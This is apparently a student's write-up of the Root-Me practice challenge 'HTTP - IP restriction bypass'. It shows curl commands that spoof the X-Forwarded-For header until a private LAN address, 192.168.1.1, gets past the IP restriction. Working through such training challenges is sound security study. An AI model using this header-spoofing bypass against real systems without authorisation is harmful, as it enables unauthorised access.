### 1.3.5: Challenge "HTTP - IP restriction bypass" (10 Points)

I looked up how to change the IP address with the curl command, which is done with the
**X-Forwarded-For** Header. First I did
```bash
curl -H "X-Forwarded-For: 212.129.38.224" -v http://challenge01.root-me.org/web-serveur/ch68/
```
which is this site's server IP address, then
```bash
curl -H "X-Forwarded-For: 127.0.0.1" -v http://challenge01.root-me.org/web-serveur/ch68/
```
for localhost, but both of these approaches did not work.
Then finally I figured out that the LAN IP addresses start with the prefix "192.168", thus I
entered
```bash
curl -H "X-Forwarded-For: 192.168.1.1" -v http://challenge01.root-me.org/web-serveur/ch68/
```
which did work.
